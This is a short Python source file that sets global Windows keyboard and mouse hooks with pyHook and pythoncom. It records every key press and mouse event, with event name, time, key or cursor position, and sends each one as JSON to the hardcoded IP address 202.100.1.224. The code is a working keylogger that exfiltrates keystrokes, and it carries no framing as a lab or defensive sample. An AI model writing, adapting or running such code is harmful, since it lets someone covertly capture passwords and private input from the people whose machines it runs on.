import pythoncom, pyHook
from flask_client_json import http_post_json
def OnKeyboardEvent(event):
    dict_key = {}
    dict_key['MessageType'] = 'KeyboardEvent'
    dict_key['MessageName'] = event.MessageName
    dict_key['Time'] = event.Time
    dict_key['Key:'] = event.Key
    http_post_json('202.100.1.224',dict_key)
    return True

def OnMouseEvent(event):
    dict_key = {}
    dict_key['MessageType'] = 'MouseEvent'
    dict_key['MessageName'] = event.MessageName
    dict_key['Time'] = event.Time
    dict_key['Position'] = event.Position
    dict_key['Wheel'] = event.Wheel
    http_post_json('202.100.1.224',dict_key)
    return True     

def key_mouse_logger():
    # create a hook manager
    hm = pyHook.HookManager()
    # watch for all keyboard events
    hm.KeyDown = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # watch for all mouse events
    hm.MouseAll = OnMouseEvent
    # set the hook
    hm.HookMouse()
    # wait forever
    pythoncom.PumpMessages()

if __name__ == '__main__':
    key_mouse_logger()